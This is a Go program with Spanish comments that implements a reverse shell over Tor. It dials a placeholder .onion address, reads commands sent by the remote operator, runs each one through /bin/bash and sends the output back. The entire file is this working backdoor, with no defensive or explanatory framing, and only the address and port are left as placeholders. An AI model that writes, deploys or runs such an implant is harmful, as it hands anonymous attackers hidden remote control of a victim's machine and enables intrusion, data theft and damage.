package main

import (
	"bufio"
	"fmt"
	"net"

	"github.com/cretz/bine/tor"
	"os/exec"
)

func createSocket(targetIP string, targetPort string) (net.Conn, error) {
	// Crear un nuevo controlador de tor
	ctrl, err := tor.StartCtl()
	if err != nil {
		return nil, err
	}
	defer ctrl.Close()

	// Crear una nueva conexión a la red Tor
	dialer, err := tor.DialerFromCtl(ctrl)
	if err != nil {
		return nil, err
	}

	// Conectarse a la dirección .onion y puerto especificados
	conn, err := dialer.Dial("tcp", targetIP+":"+targetPort)
	if err != nil {
		return nil, err
	}
	fmt.Fprintf(conn, "Connected\n")
	return conn, nil
}

func main() {
	targetIP := "<dirección_onion>"
	targetPort := "<puerto>"

	conn, err := createSocket(targetIP, targetPort)
	if err != nil {
		fmt.Println(err)
		return
	}
	defer conn.Close()

	for {
		message, err := bufio.NewReader(conn).ReadString('\n')
		if err != nil {
			fmt.Println(err)
			break
		}
		if message == "exit\n" {
			break
		}
		cmd := exec.Command("/bin/bash", "-c", message)
		output, err := cmd.CombinedOutput()
		if err != nil {
			fmt.Println(err)
			break
		}
		conn.Write(output)
	}
}
